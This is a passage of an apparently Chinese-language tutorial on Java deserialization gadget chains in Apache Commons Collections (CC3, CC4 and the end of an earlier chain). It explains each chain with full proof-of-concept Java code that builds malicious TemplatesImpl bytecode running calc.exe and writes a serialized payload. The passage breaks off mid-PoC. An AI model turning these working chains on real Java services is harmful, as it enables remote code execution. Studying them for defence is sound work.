            <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> Class[]{Object.class, Object[].class}, <span class="hljs-keyword">new</span> Object[]{<span class="hljs-keyword">null</span>, <span class="hljs-keyword">new</span> Object[<span class="hljs-number">0</span>]}),
            <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> Class[]{String.class}, <span class="hljs-keyword">new</span> Object[]{<span class="hljs-string">&quot;calc.exe&quot;</span>}),
            <span class="hljs-keyword">new</span> ConstantTransformer(<span class="hljs-number">1</span>)
        };
        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(transformers);
        Map innerMap = <span class="hljs-keyword">new</span> HashMap();
        <span class="hljs-comment">// &#x8C03;&#x7528;decorate&#x4E3B;&#x8981;&#x662F;&#x76F4;&#x63A5;&#x5199;&#x5165;&#x7684;&#x65B9;&#x6CD5;&#x662F;protected, &#x9700;&#x8981;&#x8BBE;&#x7F6E;&#x6743;&#x9650;&#x624D;&#x884C;, &#x800C;&#x8BE5;&#x65B9;&#x6CD5;&#x662F;public</span>
        Map outerMap = LazyMap.decorate(innerMap, chainedTransformer);
        <span class="hljs-comment">/**
         * BadAttributeValueException.readObject -&gt;
         * TiedMapEntry.toString -&gt;
         * TiedMapEntry.getValue -&gt;
         * (this.map.get)LazyMap.get -&gt;
         * ChainedTransformer.transform
         * */</span>
        TiedMapEntry tiedMapEntry = <span class="hljs-keyword">new</span> TiedMapEntry(outerMap, <span class="hljs-string">&quot;ricky&quot;</span>);
        <span class="hljs-comment">/*jdk1.8*/</span>
        BadAttributeValueExpException badAttributeValueExpException = <span class="hljs-keyword">new</span> BadAttributeValueExpException(<span class="hljs-keyword">null</span>);
<span class="hljs-comment">//        setFieldValue(badAttributeValueExpException, &quot;val&quot;, tiedMapEntry); //&#x8C03;&#x7528;CC2&#x5199;&#x597D;&#x7684;&#x8BBE;&#x7F6E;&#x51FD;&#x6570;</span>
        <span class="hljs-comment">// &#x5355;&#x72EC;&#x8BBE;&#x7F6E;</span>
        Field field = badAttributeValueExpException.getClass().getDeclaredField(<span class="hljs-string">&quot;val&quot;</span>);
        field.setAccessible(<span class="hljs-keyword">true</span>);
        field.set(badAttributeValueExpException, tiedMapEntry);

        <span class="hljs-keyword">try</span>{
            <span class="hljs-comment">// serialize</span>
            ByteArrayOutputStream barr = <span class="hljs-keyword">new</span> ByteArrayOutputStream();
            ObjectOutputStream objectoutputstream = <span class="hljs-keyword">new</span> ObjectOutputStream(barr);
            objectoutputstream.writeObject(badAttributeValueExpException);
            objectoutputstream.close();
            <span class="hljs-comment">// unserialize</span>
            ObjectInputStream objectinputstream = <span class="hljs-keyword">new</span> ObjectInputStream(<span class="hljs-keyword">new</span> ByteArrayInputStream(barr.toByteArray()));
            objectinputstream.readObject();
            objectinputstream.close();
            System.out.println(Base64.encodeBase64String(barr.toByteArray()));
        }<span class="hljs-keyword">catch</span>(Exception e){
            e.printStackTrace();
        }

    }
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setFieldValue</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Object obj, <span class="hljs-keyword">final</span> String fieldName, <span class="hljs-keyword">final</span> Object value)</span> <span class="hljs-keyword">throws</span> Exception </span>{
        <span class="hljs-keyword">final</span> Field field = getField(obj.getClass(), fieldName);
        field.set(obj, value);
    }

    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Field <span class="hljs-title">getField</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Class&lt;?&gt; clazz, <span class="hljs-keyword">final</span> String fieldName)</span> </span>{
        Field field = <span class="hljs-keyword">null</span>;
        <span class="hljs-keyword">try</span> {
            field = clazz.getDeclaredField(fieldName);
            field.setAccessible(<span class="hljs-keyword">true</span>);
        }
        <span class="hljs-keyword">catch</span> (NoSuchFieldException ex) {
            <span class="hljs-keyword">if</span> (clazz.getSuperclass() != <span class="hljs-keyword">null</span>)
                field = getField(clazz.getSuperclass(), fieldName);
        }
        <span class="hljs-keyword">return</span> field;
    }
}
</code></pre>
<p><a href="http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/rev/f8a528d0379d" target="_blank">JDK1.8 AnnotationInvocationHandler &#x4FEE;&#x6539;</a></p>
<p>50&#x884C;&#x5DE6;&#x53F3;&#x79FB;&#x9664; memberValue.setValue</p>
<p><img src="img/AnnotationInvocationHandler_diff.png" alt=""></p>
<h2 id="cc3instantiatetransformer">CC3_InstantiateTransformer</h2>
<p>&#x9002;&#x7528;&#x7248;&#x672C;&#xFF1A;3.1-3.2.1&#xFF0C;jdk7u21&#x53CA;&#x4EE5;&#x524D;</p>
<h3 id="instantiatetransformer">InstantiateTransformer</h3>
<pre><code class="lang-java">    <span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">transform</span><span class="hljs-params">(Object input)</span> </span>{
        <span class="hljs-keyword">try</span> {
            <span class="hljs-keyword">if</span> (input <span class="hljs-keyword">instanceof</span> Class == <span class="hljs-keyword">false</span>) {
                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> FunctorException(
                    <span class="hljs-string">&quot;InstantiateTransformer: Input object was not an instanceof Class, it was a &quot;</span>
                        + (input == <span class="hljs-keyword">null</span> ? <span class="hljs-string">&quot;null object&quot;</span> : input.getClass().getName()));
            }
            Constructor con = ((Class) input).getConstructor(iParamTypes);
            <span class="hljs-keyword">return</span> con.newInstance(iArgs);

        } <span class="hljs-keyword">catch</span> (NoSuchMethodException ex) {
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> FunctorException(<span class="hljs-string">&quot;InstantiateTransformer: The constructor must exist and be public &quot;</span>);
        } <span class="hljs-keyword">catch</span> (InstantiationException ex) {
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> FunctorException(<span class="hljs-string">&quot;InstantiateTransformer: InstantiationException&quot;</span>, ex);
        } <span class="hljs-keyword">catch</span> (IllegalAccessException ex) {
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> FunctorException(<span class="hljs-string">&quot;InstantiateTransformer: Constructor must be public&quot;</span>, ex);
        } <span class="hljs-keyword">catch</span> (InvocationTargetException ex) {
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> FunctorException(<span class="hljs-string">&quot;InstantiateTransformer: Constructor threw an exception&quot;</span>, ex);
        }
    }
</code></pre>
<p><code>transform</code>&#x65B9;&#x6CD5;&#x4F1A;&#x53BB;&#x4F7F;&#x7528;&#x53CD;&#x5C04;&#x5B9E;&#x4F8B;&#x5316;&#x4E00;&#x4E2A;&#x5BF9;&#x8C61;&#x5E76;&#x4E14;&#x8FD4;&#x56DE;</p>
<h3 id="traxfilter">TrAXFilter</h3>
<pre><code class="lang-java">  <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">TrAXFilter</span> <span class="hljs-params">(Templates templates)</span>
    <span class="hljs-keyword">throws</span> TransformerConfigurationException
  </span>{
    m_templates = templates;
    m_transformer = (TransformerImpl)templates.newTransformer();
  }
</code></pre>
<p>&#x8C03;&#x7528;&#x4E86;&#x4F20;&#x5165;&#x53C2;&#x6570;&#x7684;<code>newTransformer()</code>&#x65B9;&#x6CD5;, &#x5EF6;&#x7EED;&#x4E86;CC2&#x7684;&#x6784;&#x9020;&#x6076;&#x610F;Class&#x7C7B;&#x8FDB;&#x884C;&#x547D;&#x4EE4;&#x6267;&#x884C;, &#x4F20;&#x5165;&#x7CBE;&#x5FC3;&#x6784;&#x9020;&#x7684;TransformerImpl&#x7C7B;&#x5373;&#x53EF;</p>
<p>POC</p>
<pre><code class="lang-java"><span class="hljs-keyword">package</span> CommonsCollections;

<span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
<span class="hljs-keyword">import</span> javassist.ClassClassPath;
<span class="hljs-keyword">import</span> javassist.ClassPool;
<span class="hljs-keyword">import</span> javassist.CtClass;
<span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;
<span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;
<span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;
<span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;
<span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;
<span class="hljs-keyword">import</span> org.apache.xalan.transformer.TrAXFilter;

<span class="hljs-keyword">import</span> javax.xml.transform.Templates;
<span class="hljs-keyword">import</span> java.io.FileInputStream;
<span class="hljs-keyword">import</span> java.io.FileOutputStream;
<span class="hljs-keyword">import</span> java.io.ObjectInputStream;
<span class="hljs-keyword">import</span> java.io.ObjectOutputStream;
<span class="hljs-keyword">import</span> java.lang.annotation.Retention;
<span class="hljs-keyword">import</span> java.lang.reflect.Constructor;
<span class="hljs-keyword">import</span> java.lang.reflect.Field;
<span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;
<span class="hljs-keyword">import</span> java.lang.reflect.Proxy;
<span class="hljs-keyword">import</span> java.util.HashMap;
<span class="hljs-keyword">import</span> java.util.Map;

<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC3_InstantiateTransformer</span> </span>{
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception</span>{
        <span class="hljs-comment">// ClassPool&#x662F; CtClass &#x5BF9;&#x8C61;&#x7684;&#x5BB9;&#x5668;&#x3002;&#x5B9E;&#x4F8B;&#x5316;&#x4E00;&#x4E2A;ClassPool&#x5BB9;&#x5668;&#x3002;</span>
        ClassPool classPool = ClassPool.getDefault();
        <span class="hljs-comment">// &#x5411;&#x5BB9;&#x5668;&#x4E2D;&#x7684;&#x7C7B;&#x641C;&#x7D22;&#x8DEF;&#x5F84;&#x7684;&#x8D77;&#x59CB;&#x4F4D;&#x7F6E;&#x63D2;&#x5165;AbstractTranslet.class&#xFF0C;&#x4E2A;&#x4EBA;&#x8BA4;&#x4E3A;&#x662F;&#x65B9;&#x4FBF;&#x8BA9;&#x540E;&#x9762;&#x80FD;&#x591F;&#x627E;&#x5230;&#x8FD9;&#x4E2A;&#x7C7B;</span>
        classPool.insertClassPath(<span class="hljs-keyword">new</span> ClassClassPath(com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet.class));
        <span class="hljs-comment">// &#x4F7F;&#x7528;&#x5BB9;&#x5668;&#x65B0;&#x5EFA;&#x4E00;&#x4E2A;CtClass&#xFF0C;&#x76F8;&#x5F53;&#x4E8E;&#x65B0;&#x5EFA;&#x4E00;&#x4E2A;class&#xFF0C;&#x7C7B;&#x540D;&#x4E3A;Evil</span>
        CtClass ctClass = classPool.makeClass(<span class="hljs-string">&quot;Evil&quot;</span>);
        String cmd = <span class="hljs-string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;%s\&quot;);&quot;</span>;
        cmd = String.format(cmd, <span class="hljs-string">&quot;calc.exe&quot;</span>);
        <span class="hljs-comment">// &#x7ED9;&#x8FD9;&#x4E2A;&#x7C7B;&#x521B;&#x5EFA; static &#x4EE3;&#x7801;&#x5757;&#xFF0C;&#x5E76;&#x63D2;&#x5165;&#x5230;&#x7C7B;&#x4E2D;</span>
        ctClass.makeClassInitializer().insertBefore(cmd);
        String className = <span class="hljs-string">&quot;Evil&quot;</span> + System.nanoTime();
        <span class="hljs-comment">// &#x91CD;&#x65B0;&#x8BBE;&#x7F6E;&#x7C7B;&#x540D;&#x4E3A;&#x4E00;&#x4E2A;&#x968F;&#x673A;&#x7684;&#x540D;&#x5B57;</span>
        ctClass.setName(className);
        <span class="hljs-comment">// &#x7ED9;&#x8FD9;&#x4E2A;&#x7C7B;&#x6DFB;&#x52A0;&#x4E00;&#x4E2A;&#x7236;&#x7C7B;&#xFF0C;&#x5373;&#x7EE7;&#x627F;&#x8BE5;&#x7236;&#x7C7B;&#x3002;</span>
        ctClass.setSuperclass(classPool.get(AbstractTranslet.class.getName())); <span class="hljs-comment">// &#x8BBE;&#x7F6E;&#x7236;&#x7C7B;&#x4E3A;AbstractTranslet&#xFF0C;&#x907F;&#x514D;&#x62A5;&#x9519;</span>
        <span class="hljs-comment">// &#x5C06;&#x8FD9;&#x4E2A;&#x7C7B;&#x8F93;&#x51FA;&#x5230;&#x9879;&#x76EE;&#x76EE;&#x5F55;&#x4E0B;</span>
<span class="hljs-comment">//        ctClass.writeFile(&quot;./&quot;);</span>
        <span class="hljs-comment">// &#x5C06;&#x8FD9;&#x4E2A;class&#x8F6C;&#x6362;&#x4E3A;&#x5B57;&#x8282;&#x6570;&#x7EC4;</span>
        <span class="hljs-keyword">byte</span>[] classBytes = ctClass.toBytecode();
        <span class="hljs-comment">// &#x5C06;&#x5B57;&#x8282;&#x6570;&#x7EC4;&#x653E;&#x7F6E;&#x5230;&#x4E00;&#x4E2A;&#x4E8C;&#x7EF4;&#x6570;&#x7EC4;&#x7684;&#x7B2C;&#x4E00;&#x4E2A;&#x5143;&#x7D20;</span>
        <span class="hljs-keyword">byte</span>[][] targetByteCodes = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[][]{classBytes};
        <span class="hljs-comment">// &#x521B;&#x5EFA;TemplatesImpl&#x5B9E;&#x4F8B;</span>
        Object templatesImpl=Class.forName(<span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>).getDeclaredConstructor(<span class="hljs-keyword">new</span> Class[]{}).newInstance();
        <span class="hljs-comment">// &#x901A;&#x8FC7;&#x53CD;&#x5C04;&#x8BBE;&#x7F6E;&#x5B57;&#x6BB5;&#x7684;&#x503C;&#x4E3A;&#x4E8C;&#x7EF4;&#x5B57;&#x8282;&#x6570;&#x7EC4;</span>
        setFieldValue(templatesImpl, <span class="hljs-string">&quot;_bytecodes&quot;</span>, targetByteCodes);
        <span class="hljs-comment">// &#x8FDB;&#x5165; defineTransletClasses() &#x65B9;&#x6CD5;&#x9700;&#x8981;&#x7684;&#x6761;&#x4EF6;</span>
        setFieldValue(templatesImpl, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;name&quot;</span>);

        <span class="hljs-comment">/** CC3 TrAXFilter&#x4E0E;InstantiateTransformer&#x7ED3;&#x5408;*/</span>
        Transformer[] fakeTransformers = <span class="hljs-keyword">new</span> Transformer[] {<span class="hljs-keyword">new</span> ConstantTransformer(<span class="hljs-number">1</span>)};
        Transformer[] transformers = <span class="hljs-keyword">new</span> Transformer[]{
            <span class="hljs-keyword">new</span> ConstantTransformer(TrAXFilter.class),
            <span class="hljs-keyword">new</span> InstantiateTransformer(<span class="hljs-keyword">new</span> Class[]{Templates.class}, <span class="hljs-keyword">new</span> Object[]{templatesImpl})
        };

        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(fakeTransformers);
        Map innerMap = <span class="hljs-keyword">new</span> HashMap();
        Map outerMap = LazyMap.decorate(innerMap, chainedTransformer);
        Class clazz = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);
        Constructor constructor = clazz.getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(<span class="hljs-keyword">true</span>);
        InvocationHandler invocationHandler = (InvocationHandler) constructor.newInstance(Retention.class, outerMap);
        Map ProxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), <span class="hljs-keyword">new</span> Class[]{Map.class}, invocationHandler);
        <span class="hljs-comment">//&#x901A;&#x8FC7;&#x53CD;&#x5C04;&#x8986;&#x76D6;&#x539F;&#x672C;&#x7684;iTransformers&#xFF0C;&#x9632;&#x6B62;&#x5E8F;&#x5217;&#x5316;&#x65F6;&#x5728;&#x672C;&#x5730;&#x6267;&#x884C;&#x547D;&#x4EE4;</span>
        Field f = chainedTransformer.getClass().getDeclaredField(<span class="hljs-string">&quot;iTransformers&quot;</span>);
        f.setAccessible(<span class="hljs-keyword">true</span>);
        f.set(chainedTransformer, transformers);
        Object cc3 = constructor.newInstance(Retention.class, ProxyMap);

        <span class="hljs-keyword">try</span>{
            ObjectOutputStream outputStream = <span class="hljs-keyword">new</span> ObjectOutputStream(<span class="hljs-keyword">new</span> FileOutputStream(<span class="hljs-string">&quot;payload.bin&quot;</span>));
            outputStream.writeObject(cc3);
            outputStream.close();

            ObjectInputStream inputStream = <span class="hljs-keyword">new</span> ObjectInputStream(<span class="hljs-keyword">new</span> FileInputStream(<span class="hljs-string">&quot;payload.bin&quot;</span>));
            inputStream.readObject();
        }<span class="hljs-keyword">catch</span>(Exception e){
            e.printStackTrace();
        }
    }

    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setFieldValue</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Object obj, <span class="hljs-keyword">final</span> String fieldName, <span class="hljs-keyword">final</span> Object value)</span> <span class="hljs-keyword">throws</span> Exception </span>{
        <span class="hljs-keyword">final</span> Field field = getField(obj.getClass(), fieldName);
        field.set(obj, value);
    }

    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Field <span class="hljs-title">getField</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Class&lt;?&gt; clazz, <span class="hljs-keyword">final</span> String fieldName)</span> </span>{
        Field field = <span class="hljs-keyword">null</span>;
        <span class="hljs-keyword">try</span> {
            field = clazz.getDeclaredField(fieldName);
            field.setAccessible(<span class="hljs-keyword">true</span>);
        }
        <span class="hljs-keyword">catch</span> (NoSuchFieldException ex) {
            <span class="hljs-keyword">if</span> (clazz.getSuperclass() != <span class="hljs-keyword">null</span>)
                field = getField(clazz.getSuperclass(), fieldName);
        }
        <span class="hljs-keyword">return</span> field;
    }
}
</code></pre>
<h2 id="cc4mixed-with-cc2-and-cc3">CC4_mixed with CC2 and CC3</h2>
<p>&#x9002;&#x7528;&#x7248;&#x672C;&#xFF1A;4.0&#xFF0C;jdk7u21&#x53CA;&#x4EE5;&#x524D; </p>
<p>CC4&#x94FE;&#x4E2D;&#x5728;&#x8FD9;&#x6BB5;&#x4EE3;&#x7801;&#x4E2D;&#x5C31;&#x505A;&#x4E86;&#x4E00;&#x4E2A;&#x7B80;&#x5355;&#x7684;&#x4FEE;&#x6539;&#x3002;</p>
<pre><code class="lang-java"><span class="hljs-comment">/**CommonsCollections4&#x533A;&#x522B;&#x4E4B;&#x5904;*/</span>
Transformer[] transformers = <span class="hljs-keyword">new</span> Transformer[]{
    <span class="hljs-keyword">new</span> ConstantTransformer(TrAXFilter.class),
     <span class="hljs-keyword">new</span> InstantiateTransformer(<span class="hljs-keyword">new</span> Class[]{Templates.class}, <span class="hljs-keyword">new</span> Object[]{templates})
};
ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(transformers);
TransformingComparator transformingComparator = <span class="hljs-keyword">new</span> TransformingComparator(chainedTransformer);
</code></pre>
<p>&#x7B2C;&#x4E00;&#x6B65;&#x662F;new&#x4E86;&#x4E00;&#x4E2A;<code>ConstantTransformer</code>&#x5BF9;&#x8C61;&#x5B58;&#x50A8;&#x5728;<code>Transformer[]</code>&#x6570;&#x7EC4;&#x4E2D;&#x4F20;&#x5165;&#x7684;&#x53C2;&#x6570;&#x662F;<code>TrAXFilter.class</code>&#xFF0C;&#x5982;&#x679C;&#x8C03;&#x7528;&#x5230;<code>ConstantTransformer</code>&#x5B9E;&#x4F8B;&#x5316;&#x5BF9;&#x8C61;&#x7684;<code>transform</code>&#x65B9;&#x6CD5;&#x4F1A;&#x76F4;&#x63A5;&#x8FD4;&#x56DE;&#x4E00;&#x4E2A;<code>TrAXFilter</code>&#x5BF9;&#x8C61;&#x3002;</p>
<p>&#x7B2C;&#x4E8C;&#x6B65;new&#x4E86;&#x4E00;&#x4E2A;<code>InstantiateTransformer</code>&#x5BF9;&#x8C61;&#x4F20;&#x5165;&#x7684;&#x662F;<code>Templates.class</code>&#x548C;&#x6784;&#x9020;&#x7684;&#x6076;&#x610F;<code>templates</code>&#x5B9E;&#x4F8B;&#x5316;&#x5BF9;&#x8C61;&#x3002;</p>
<p>&#x7B2C;&#x4E09;&#x6B65;&#x662F;&#x4F7F;&#x7528;&#x4E86;<code>ChainedTransformer</code>&#x7684;&#x4FEE;&#x9970;&#x5668;&#x5C06;<code>Transformer[]</code>&#x6570;&#x7EC4;&#x4F20;&#x5165;&#x53C2;&#x6570;&#xFF0C;&#x5F53;&#x8C03;&#x7528;<code>transform</code>&#x65B9;&#x6CD5;&#x5C06;&#x7ED9;<code>Transformer[]</code>&#x6570;&#x7EC4;&#x7ED9;&#x904D;&#x5386;&#x8C03;&#x7528;<code>transform</code>&#x65B9;&#x6CD5;&#x3002;</p>
<p>&#x7B2C;&#x56DB;&#x6B65;&#x5C06;<code>ChainedTransformer</code>&#x4FEE;&#x9970;&#x540E;&#x7684;&#x5BF9;&#x8C61;&#x518D;&#x4F7F;&#x7528;<code>TransformingComparator</code>&#x4FEE;&#x9970;&#x5668;&#x7ED9;&#x4FEE;&#x9970;&#x4E00;&#x904D;&#xFF0C;&#x8FD9;&#x91CC;&#x518D;&#x4F7F;&#x7528;<code>TransformingComparator</code>&#x6765;&#x4FEE;&#x9970;&#x4E00;&#x4E0B;&#xFF0C;&#x8FD9;&#x6837;&#x7B49;&#x8C03;&#x7528;&#x5230;&#x8BE5;&#x5B9E;&#x4F8B;&#x5316;&#x5BF9;&#x8C61;&#x7684;<code>compare</code>&#x65B9;&#x6CD5;&#x7684;&#x65F6;&#x5019;&#x5C31;&#x4F1A;&#x53BB;&#x904D;&#x5386;&#x8C03;&#x7528;<code>Transformer[]</code>&#x7684;<code>transform</code>&#x65B9;&#x6CD5;&#x3002;(&#x8981;&#x6C42;&#x5FC5;&#x987B;&#x662F;Comparator&#x624D;&#x53EF;&#x8D4B;&#x503C;<code>this.comparator</code>)</p>
<p>POC</p>
<pre><code class="lang-java"><span class="hljs-keyword">package</span> CommonsCollections;

<span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
<span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
<span class="hljs-keyword">import</span> javassist.ClassClassPath;
<span class="hljs-keyword">import</span> javassist.ClassPool;
<span class="hljs-keyword">import</span> javassist.CtClass;
<span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;
<span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;
<span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.InstantiateTransformer;
<span class="hljs-keyword">import</span> org.apache.commons.collections4.Transformer;
<span class="hljs-keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;
<span class="hljs-keyword">import</span> org.apache.xalan.transformer.TrAXFilter;

<span class="hljs-keyword">import</span> javax.xml.transform.Templates;
<span class="hljs-keyword">import</span> java.io.FileInputStream;
<span class="hljs-keyword">import</span> java.io.FileOutputStream;
<span class="hljs-keyword">import</span> java.io.ObjectInputStream;
<span class="hljs-keyword">import</span> java.io.ObjectOutputStream;
<span class="hljs-keyword">import</span> java.lang.reflect.Field;
<span class="hljs-keyword">import</span> java.util.PriorityQueue;

<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CommonsCollections4</span> </span>{
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception</span>{
        <span class="hljs-comment">// &#x5B9E;&#x4F8B;&#x5316;PriorityQueue&#x5BF9;&#x8C61;</span>
        PriorityQueue priorityQueue = <span class="hljs-keyword">new</span> PriorityQueue(<span class="hljs-number">1</span>);
        <span class="hljs-comment">// ClassPool&#x662F; CtClass &#x5BF9;&#x8C61;&#x7684;&#x5BB9;&#x5668;&#x3002;&#x5B9E;&#x4F8B;&#x5316;&#x4E00;&#x4E2A;ClassPool&#x5BB9;&#x5668;&#x3002;</span>
        ClassPool classPool = ClassPool.getDefault();
        <span class="hljs-comment">// &#x5411;&#x5BB9;&#x5668;&#x4E2D;&#x7684;&#x7C7B;&#x641C;&#x7D22;&#x8DEF;&#x5F84;&#x7684;&#x8D77;&#x59CB;&#x4F4D;&#x7F6E;&#x63D2;&#x5165;AbstractTranslet.class&#xFF0C;&#x4E2A;&#x4EBA;&#x8BA4;&#x4E3A;&#x662F;&#x65B9;&#x4FBF;&#x8BA9;&#x540E;&#x9762;&#x80FD;&#x591F;&#x627E;&#x5230;&#x8FD9;&#x4E2A;&#x7C7B;</span>
        classPool.insertClassPath(<span class="hljs-keyword">new</span> ClassClassPath(AbstractTranslet.class));
        <span class="hljs-comment">// &#x4F7F;&#x7528;&#x5BB9;&#x5668;&#x65B0;&#x5EFA;&#x4E00;&#x4E2A;CtClass&#xFF0C;&#x76F8;&#x5F53;&#x4E8E;&#x65B0;&#x5EFA;&#x4E00;&#x4E2A;class&#xFF0C;&#x7C7B;&#x540D;&#x4E3A;Evil</span>
        CtClass ctClass = classPool.makeClass(<span class="hljs-string">&quot;Evil&quot;</span>);
        String cmd = <span class="hljs-string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;%s\&quot;);&quot;</span>;
        cmd = String.format(cmd, <span class="hljs-string">&quot;calc.exe&quot;</span>);
        <span class="hljs-comment">// &#x7ED9;&#x8FD9;&#x4E2A;&#x7C7B;&#x521B;&#x5EFA; static &#x4EE3;&#x7801;&#x5757;&#xFF0C;&#x5E76;&#x63D2;&#x5165;&#x5230;&#x7C7B;&#x4E2D;</span>
        ctClass.makeClassInitializer().insertBefore(cmd);
        String className = <span class="hljs-string">&quot;Evil&quot;</span> + System.nanoTime();
        <span class="hljs-comment">// &#x91CD;&#x65B0;&#x8BBE;&#x7F6E;&#x7C7B;&#x540D;&#x4E3A;&#x4E00;&#x4E2A;&#x968F;&#x673A;&#x7684;&#x540D;&#x5B57;</span>
        ctClass.setName(className);
        <span class="hljs-comment">// &#x7ED9;&#x8FD9;&#x4E2A;&#x7C7B;&#x6DFB;&#x52A0;&#x4E00;&#x4E2A;&#x7236;&#x7C7B;&#xFF0C;&#x5373;&#x7EE7;&#x627F;&#x8BE5;&#x7236;&#x7C7B;&#x3002;</span>
        ctClass.setSuperclass(classPool.get(AbstractTranslet.class.getName())); <span class="hljs-comment">// &#x8BBE;&#x7F6E;&#x7236;&#x7C7B;&#x4E3A;AbstractTranslet&#xFF0C;&#x907F;&#x514D;&#x62A5;&#x9519;</span>
        <span class="hljs-comment">// &#x5C06;&#x8FD9;&#x4E2A;&#x7C7B;&#x8F93;&#x51FA;&#x5230;&#x9879;&#x76EE;&#x76EE;&#x5F55;&#x4E0B;</span>
<span class="hljs-comment">//        ctClass.writeFile(&quot;./&quot;);</span>
        <span class="hljs-comment">// &#x5C06;&#x8FD9;&#x4E2A;class&#x8F6C;&#x6362;&#x4E3A;&#x5B57;&#x8282;&#x6570;&#x7EC4;</span>
        <span class="hljs-keyword">byte</span>[] classBytes = ctClass.toBytecode();
        <span class="hljs-comment">// &#x5C06;&#x5B57;&#x8282;&#x6570;&#x7EC4;&#x653E;&#x7F6E;&#x5230;&#x4E00;&#x4E2A;&#x4E8C;&#x7EF4;&#x6570;&#x7EC4;&#x7684;&#x7B2C;&#x4E00;&#x4E2A;&#x5143;&#x7D20;</span>
        <span class="hljs-keyword">byte</span>[][] targetByteCodes = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[][]{classBytes};
        <span class="hljs-comment">// &#x5B9E;&#x4F8B;&#x5316;TemplatesImpl&#x5BF9;&#x8C61;</span>
        TemplatesImpl templates = (TemplatesImpl) Class.forName(<span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>).getDeclaredConstructor(<span class="hljs-keyword">new</span> Class[]{}).newInstance();

        <span class="hljs-comment">/**CommonCollections4&#x533A;&#x522B;&#x4E4B;&#x5904;*/</span>
        Transformer[] transformers = <span class="hljs-keyword">new</span> Transformer[]{
            <span class="hljs-keyword">new</span> ConstantTransformer(TrAXFilter.class),
            <span class="hljs-keyword">new</span> InstantiateTransformer(<span class="hljs-keyword">new</span> Class[]{Templates.class}, <span class="hljs-keyword">new</span> Object[]{templates})
        };
        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(transformers);
        TransformingComparator transformingComparator = <span class="hljs-keyword">new</span> TransformingComparator(chainedTransformer);

        <span class="hljs-comment">// &#x901A;&#x8FC7;&#x53CD;&#x5C04;&#x8BBE;&#x7F6E;&#x5B57;&#x6BB5;&#x7684;&#x503C;&#x4E3A;&#x4E8C;&#x7EF4;&#x5B57;&#x8282;&#x6570;&#x7EC4;</span>
        setFieldValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, targetByteCodes);
        <span class="hljs-comment">// &#x8FDB;&#x5165; defineTransletClasses() &#x65B9;&#x6CD5;&#x9700;&#x8981;&#x7684;&#x6761;&#x4EF6;</span>
        setFieldValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;name&quot;</span>);
        setFieldValue(templates, <span class="hljs-string">&quot;_class&quot;</span>, <span class="hljs-keyword">null</span>);
